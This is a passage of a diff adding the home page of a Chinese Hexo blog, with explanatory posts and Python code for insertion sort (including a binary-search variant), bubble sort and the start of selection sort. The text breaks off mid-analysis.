@@ -1,0 +1,2501 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"xloudmax.fun","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Welc0me t0 the base">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Xloudmax">
+<meta property="og:url" content="http://xloudmax.fun/index.html">
+<meta property="og:site_name" content="Xloudmax">
+<meta property="og:description" content="Welc0me t0 the base">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="Xloudmax">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://xloudmax.fun/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Xloudmax</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+  <meta charset="UTF-8">
+  <title>live2d-demo</title>
+  <script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+  <!-- Live2DCubismCore -->
+  <script src="https://cdn.jsdelivr.net/gh/litstronger/live2d-moc3@master/js/frame/live2dcubismcore.min.js"></script>
+  <!-- Include Pixi. -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/4.6.1/pixi.min.js"></script>
+  <!-- Include Cubism Components. -->
+  <script src="https://cdn.jsdelivr.net/gh/litstronger/live2d-moc3@master/js/live2dcubismframework.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/litstronger/live2d-moc3@master/js/live2dcubismpixi.js"></script>
+  <!-- User's Script -->
+  <script src="https://cdn.jsdelivr.net/gh/litstronger/live2d-moc3@master/js/l2d.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/litstronger/live2d-moc3@master/js/main.js"></script>
+  <style>
+  </style>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Xloudmax</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Note</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-commonweal">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://xloudmax.fun/2024/05/28/%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Xloudmax">
+      <meta itemprop="description" content="Welc0me t0 the base">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xloudmax">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/05/28/%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F/" class="post-title-link" itemprop="url">插入排序</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-05-28 22:32:25 / 修改时间：22:31:42" itemprop="dateCreated datePublished" datetime="2024-05-28T22:32:25+08:00">2024-05-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AE%97%E6%B3%95/" itemprop="url" rel="index"><span itemprop="name">算法</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F/" itemprop="url" rel="index"><span itemprop="name">排序</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><h4 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h4><p>插入排序（Insertion Sort）是一种简单直观的排序算法。通过构建有序序列，对未排序数据在已排序序列中从后向前扫描，找到相应位置并插入，直到整个数组有序。</p>
+<h4 id="二、算法思想"><a href="#二、算法思想" class="headerlink" title="二、算法思想"></a>二、算法思想</h4><ol>
+<li>从第一个元素开始，视为已排序部分。</li>
+<li>取出下一个元素，与已排序部分的元素进行比较。</li>
+<li>如果该元素小于已排序部分的最后一个元素，则将其插入到已排序部分的适当位置。</li>
+</ol>
+<p>重复上述步骤，直到整个数组排序完毕。</p>
+<h4 id="三、动图演示"><a href="#三、动图演示" class="headerlink" title="三、动图演示"></a>三、动图演示</h4><p><img src="https://s2.loli.net/2024/05/28/LzrRGOyP72e3giD.gif" alt="insertion_sort_visualization_with_colors_slow"><br>首先将「第二个元素」和「第一个元素」进行「比较」，如果前者小于等于后者，则将后者进行向后「移动」，前者则执行插入；然后进行第二轮「比较」，即「第三个元素」和「第二个元素」、「第一个元素」进行「比较」，直到「前三个元素」保持有序。经过多轮「比较」和「移动」后，所有元素将按「升序」排列。</p>
+<h4 id="四、算法分析"><a href="#四、算法分析" class="headerlink" title="四、算法分析"></a>四、算法分析</h4><ol>
+<li><p><strong>时间复杂度</strong>：</p>
+<ul>
+<li>假设「比较」和「移动」的时间复杂度为 O(1)。</li>
+<li>插入排序有两个嵌套循环，外循环运行 n−1 次迭代，内部循环运行变得越来越短：<ul>
+<li>当 i = 1 时，内层循环 1 次「比较」操作。</li>
+<li>当 i = 2 时，内层循环 2 次「比较」操作。</li>
+<li>…</li>
+<li>当 i = n − 1 时，内层循环 n − 1 次「比较」操作。</li>
+</ul>
+</li>
+<li>总「比较」次数：1 + 2 + … + (n − 1) = n(n-1)/2。总时间复杂度为 O(n^2)。</li>
+</ul>
+</li>
+<li><p><strong>空间复杂度</strong>：</p>
+<ul>
+<li>算法执行过程中只有在「移动」变量时需要将变量存入临时变量 x，没有采用额外的空间，因此空间复杂度为 O(1)。</li>
+</ul>
+</li>
+</ol>
+<h4 id="五、算法的优点"><a href="#五、算法的优点" class="headerlink" title="五、算法的优点"></a>五、算法的优点</h4><ol>
+<li>简单易懂，易于实现。</li>
+<li>适用于小型数组或基本有序的数组。</li>
+<li>稳定性好，不会改变相等元素的相对顺序。</li>
+</ol>
+<h4 id="六、算法的缺点"><a href="#六、算法的缺点" class="headerlink" title="六、算法的缺点"></a>六、算法的缺点</h4><ol>
+<li>对于大型无序数组，效率较低。</li>
+<li>不适合大规模数据排序。</li>
+</ol>
+<h4 id="七、优化方案"><a href="#七、优化方案" class="headerlink" title="七、优化方案"></a>七、优化方案</h4><p>插入排序在众多排序算法中效率较低，时间复杂度为 O(n^2)。在进行插入操作之前，可以利用「二分查找」找到对应的位置。然而，插入过程的时间复杂度仍为 O(n)，所以优化的只是常数时间，最坏时间复杂度不变。</p>
+<p><strong>改进思路</strong>：在执行插入操作之前，利用「二分查找」找到需要插入的位置。<br>改进插入排序的思路是在执行插入操作之前，利用「二分查找」找到需要插入的位置。以下是详细的步骤：</p>
+<h3 id="改进思路"><a href="#改进思路" class="headerlink" title="改进思路"></a>改进思路</h3><ol>
+<li><p><strong>二分查找</strong>：<br>在已排序的部分数组中使用二分查找找到需要插入的位置。二分查找可以在 O(log n) 时间内找到插入位置。</p>
+</li>
+<li><p><strong>元素移动</strong>：<br>找到插入位置后，将插入位置之后的元素向后移动一个位置，为插入元素腾出空间。</p>
+</li>
+<li><p><strong>插入元素</strong>：<br>将当前元素插入到找到的位置。</p>
+</li>
+</ol>
+<h3 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h3><ol>
+<li><p><strong>遍历未排序部分</strong>：<br>对数组的每个未排序元素，从第二个元素开始，进行插入排序。</p>
+</li>
+<li><p><strong>使用二分查找找到插入位置</strong>：<br>在已排序部分使用二分查找找到插入位置。</p>
+</li>
+<li><p><strong>移动元素</strong>：<br>将插入位置之后的元素向后移动一个位置。</p>
+</li>
+<li><p><strong>插入元素</strong>：<br>将当前元素插入到找到的位置。</p>
+</li>
+</ol>
+<h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><p>以下是一个使用二分查找优化的插入排序的 Python 实现：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> bisect</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binary_insertion_sort</span>(<span class="params">arr</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(arr)):</span><br><span class="line">        key = arr[i]</span><br><span class="line">        <span class="comment"># 使用二分查找找到插入位置</span></span><br><span class="line">        j = bisect.bisect_left(arr[:i], key)</span><br><span class="line">        <span class="comment"># 将插入位置之后的元素向后移动一个位置</span></span><br><span class="line">        arr = arr[:j] + [key] + arr[j:i] + arr[i+<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例列表</span></span><br><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用二分查找优化的插入排序函数</span></span><br><span class="line">sorted_list = binary_insertion_sort(list1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印排序后的列表</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;排序后的列表:&quot;</span>, sorted_list)</span><br></pre></td></tr></table></figure>
+<h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><ol>
+<li><p><strong>二分查找</strong>：<br>使用 <code>bisect_left</code> 方法在已排序部分查找插入位置，该方法返回应插入元素的位置，使得数组仍保持有序。</p>
+</li>
+<li><p><strong>元素移动</strong>：<br>将插入位置之后的元素向后移动一个位置，为插入元素腾出空间。通过切片操作，将数组分为三部分：插入位置之前的部分、插入元素、插入位置之后的部分。</p>
+</li>
+<li><p><strong>插入元素</strong>：<br>将当前元素插入到找到的位置。</p>
+</li>
+</ol>
+<p>这种改进将查找插入位置的时间复杂度从 O(n) 降低到 O(log n)，从而在一定程度上提高了插入排序的效率，尽管整体时间复杂度仍然是 O(n^2)，但在实际应用中可能会有性能提升。</p>
+<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">
+      
+    </div>
+
+    
+    
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://xloudmax.fun/2024/05/27/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Xloudmax">
+      <meta itemprop="description" content="Welc0me t0 the base">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xloudmax">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/05/27/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F/" class="post-title-link" itemprop="url">冒泡排序</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-05-27 16:46:45 / 修改时间：17:35:03" itemprop="dateCreated datePublished" datetime="2024-05-27T16:46:45+08:00">2024-05-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AE%97%E6%B3%95/" itemprop="url" rel="index"><span itemprop="name">算法</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F/" itemprop="url" rel="index"><span itemprop="name">排序</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="冒泡排序（Bubble-Sort）算法详解"><a href="#冒泡排序（Bubble-Sort）算法详解" class="headerlink" title="冒泡排序（Bubble Sort）算法详解"></a>冒泡排序（Bubble Sort）算法详解</h1><h2 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h2><p>冒泡排序（Bubble Sort）是一种简单的排序算法，通过多次比较和交换相邻的元素，将数组中的元素按升序或降序排列。</p>
+<h2 id="二、算法思想"><a href="#二、算法思想" class="headerlink" title="二、算法思想"></a>二、算法思想</h2><p>冒泡排序的基本思想是：每次遍历数组，比较相邻的两个元素，如果它们的顺序错误，就将它们交换，直到数组中的所有元素都被遍历过。</p>
+<p>具体的算法步骤如下：</p>
+<ol>
+<li><strong>第一步</strong>：遍历数组的第一个元素到最后一个元素。</li>
+<li><strong>第二步</strong>：对每一个元素，与其后一个元素进行比较。</li>
+<li><strong>第三步</strong>：如果顺序错误，就将它们交换。</li>
+</ol>
+<p>重复上述步骤，直到数组中的所有元素都被遍历过至少一次。</p>
+<h2 id="三、动图演示"><a href="#三、动图演示" class="headerlink" title="三、动图演示"></a>三、动图演示</h2><p><img src="https://s2.loli.net/2024/05/27/ZI5PWcY98ljNoSG.gif" alt="bubble_sort"><br>冒泡排序完整排序视频可以直观展示排序过程。关键步骤如下：</p>
+<ol>
+<li>首先比较第一个元素和第二个元素，如果前者大于后者，则交换，然后再比较第二个元素和第三个元素，以此类推，直到最大的那个元素被移动到最后的位置。</li>
+<li>然后，进行第二轮比较，直到次大的那个元素被移动到倒数第二的位置。</li>
+<li>最后，经过一定轮次的比较和交换之后，所有元素将按升序排列。</li>
+</ol>
+<h2 id="四、算法分析"><a href="#四、算法分析" class="headerlink" title="四、算法分析"></a>四、算法分析</h2><h3 id="1-时间复杂度"><a href="#1-时间复杂度" class="headerlink" title="1. 时间复杂度"></a>1. 时间复杂度</h3><p>假设比较和交换的时间复杂度为 ( O(1) )。</p>
+<p>冒泡排序中有两个嵌套循环：</p>
+<ul>
+<li>外循环正好运行 ( n-1 ) 次迭代。</li>
+<li><p>内循环的运行次数逐渐减少：</p>
+<ul>
+<li>当 ( i=0 )，内层循环进行 ( n-1 ) 次比较操作。</li>
+<li>当 ( i=1 )，内层循环进行 ( n-2 ) 次比较操作。</li>
+<li>依此类推，直到 ( i=n-2 )，内层循环进行 1 次比较操作。</li>
+<li>当 ( i=n-1 )，内层循环进行 0 次比较操作。</li>
+</ul>
+</li>
+</ul>
+<p>总比较次数为：</p>
+<script type="math/tex; mode=display">(n-1) + (n-2) + ... + 1 + 0 = \frac{n(n-1)}{2}</script><p>因此，总时间复杂度为 ( O(n^2) )。</p>
+<h3 id="2-空间复杂度"><a href="#2-空间复杂度" class="headerlink" title="2. 空间复杂度"></a>2. 空间复杂度</h3><p>由于算法在执行过程中，只有交换变量时使用了临时变量，并且没有采用任何额外的空间，所以空间复杂度为 ( O(1) )。</p>
+<h2 id="五、算法的优点"><a href="#五、算法的优点" class="headerlink" title="五、算法的优点"></a>五、算法的优点</h2><ol>
+<li><strong>简单易懂</strong>：冒泡排序的算法思想非常简单，容易理解和实现。</li>
+<li><strong>稳定排序</strong>：冒泡排序是一种稳定的排序算法，即在排序过程中不会改变相同元素的相对顺序。</li>
+</ol>
+<h2 id="六、算法的缺点"><a href="#六、算法的缺点" class="headerlink" title="六、算法的缺点"></a>六、算法的缺点</h2><ol>
+<li><strong>效率较低</strong>：由于需要进行多次比较和交换，冒泡排序在处理大规模数据时效率较低。</li>
+<li><strong>排序速度慢</strong>：对于大型数组，冒泡排序的时间复杂度较高，导致排序速度较慢。</li>
+</ol>
+<h2 id="七、优化方案"><a href="#七、优化方案" class="headerlink" title="七、优化方案"></a>七、优化方案</h2><p>冒泡排序在众多排序算法中效率较低，时间复杂度为 ( O(n^2) )。</p>
+<p>例如，假设有 ( n=100000 ) 个数字。即使计算机速度超快，并且可以在 1 秒内计算 ( 10^8 ) 次操作，但冒泡排序仍需要大约一百秒才能完成。</p>
+<p>然而，它的外层循环是可以提前终止的。例如，假设一开始所有数字都是升序的，那么在首轮比较时没有发生任何交换，那么后面就不需要继续进行比较，直接跳出外层循环，算法提前终止。</p>
+<p>优化思路：如果通过内部循环完全不交换，意味着数组已经排好序，可以在这个点上停止算法。</p>
+<h2 id="冒泡排序代码实现"><a href="#冒泡排序代码实现" class="headerlink" title="冒泡排序代码实现"></a>冒泡排序代码实现</h2><p>以下是冒泡排序算法的Python代码实现：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">bubble_sort</span>(<span class="params">arr</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(arr)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        swapped = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, n-i-<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> arr[j] &gt; arr[j+<span class="number">1</span>]:</span><br><span class="line">                arr[j], arr[j+<span class="number">1</span>] = arr[j+<span class="number">1</span>], arr[j]</span><br><span class="line">                swapped = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> swapped:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试冒泡排序算法</span></span><br><span class="line">arr = [<span class="number">64</span>, <span class="number">34</span>, <span class="number">25</span>, <span class="number">12</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">90</span>]</span><br><span class="line">sorted_arr = bubble_sort(arr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;排序后的数组:&quot;</span>, sorted_arr)</span><br></pre></td></tr></table></figure>
+<p>该代码包括：</p>
+<ol>
+<li><strong><code>bubble_sort</code> 函数</strong>：实现冒泡排序算法。它接收一个列表 <code>arr</code> 作为参数，并返回排序后的列表。</li>
+<li><strong>内部循环</strong>：对每一个元素与其后一个元素进行比较，并在顺序错误时进行交换。</li>
+<li><strong>优化</strong>：通过检查是否发生交换来提前终止外层循环。</li>
+<li><strong>测试代码</strong>：创建一个包含一些无序元素的列表 <code>arr</code>，并调用 <code>bubble_sort</code> 函数对其进行排序，最后输出排序后的数组。</li>
+</ol>
+<p>通过运行该代码，你可以观察冒泡排序算法如何逐步将数组元素排序。</p>
+<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">
+      
+    </div>
+
+    
+    
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://xloudmax.fun/2024/05/27/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Xloudmax">
+      <meta itemprop="description" content="Welc0me t0 the base">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xloudmax">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/05/27/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/" class="post-title-link" itemprop="url">选择排序</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-05-27 16:36:06 / 修改时间：17:39:03" itemprop="dateCreated datePublished" datetime="2024-05-27T16:36:06+08:00">2024-05-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AE%97%E6%B3%95/" itemprop="url" rel="index"><span itemprop="name">算法</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F/" itemprop="url" rel="index"><span itemprop="name">排序</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="选择排序（Selection-Sort）算法详解"><a href="#选择排序（Selection-Sort）算法详解" class="headerlink" title="选择排序（Selection Sort）算法详解"></a>选择排序（Selection Sort）算法详解</h1><h2 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h2><p>选择排序（Selection Sort）是一种简单直观的排序算法。它的基本操作是从未排序序列中找到最小（或最大）元素，存放到已排序序列的末尾。重复这一过程，直到所有元素均排序完毕。</p>
+<h2 id="二、算法思想"><a href="#二、算法思想" class="headerlink" title="二、算法思想"></a>二、算法思想</h2><ol>
+<li><strong>第一步</strong>：在未排序序列中找到最小（或最大）元素，存放到排序序列的起始位置。</li>
+<li><strong>第二步</strong>：再从剩余未排序元素中继续寻找最小（或最大）元素，然后放到已排序序列的末尾。</li>
+<li>重复第二步，直到所有元素均排序完毕。</li>
+</ol>
+<h2 id="三、动图演示"><a href="#三、动图演示" class="headerlink" title="三、动图演示"></a>三、动图演示</h2><p>选择排序完整排序视频可以直观展示排序过程。关键步骤如下：</p>
+<ol>
+<li>从第一个元素到最后一个元素中选择出一个最小的元素，与第一个元素进行交换。</li>
+<li>从第二个元素到最后一个元素中选择出一个最小的元素，与第二个元素进行交换。</li>
+<li>重复上述过程，从第 (i) 个元素到最后一个元素中选择出一个最小的元素，与第 (i) 个元素进行交换。</li>
+</ol>
+<p><img src="https://s2.loli.net/2024/05/27/QfTv6rF9a1n4YDC.gif" alt="selection_sort.gif"></p>
+<p>最终，所有元素将按照升序排列。</p>
+<h2 id="四、算法分析"><a href="#四、算法分析" class="headerlink" title="四、算法分析"></a>四、算法分析</h2><h3 id="1-时间复杂度"><a href="#1-时间复杂度" class="headerlink" title="1. 时间复杂度"></a>1. 时间复杂度</h3><p>选择排序的时间复杂度分析如下：</p>
+<ul>
+<li>外循环运行 ( n - 1 ) 次迭代。</li>
+<li><p>内循环的运行次数逐渐减少：</p>
+<ul>
+<li>当 ( i = 0 )，内层循环进行 ( n - 1 ) 次比较操作。</li>
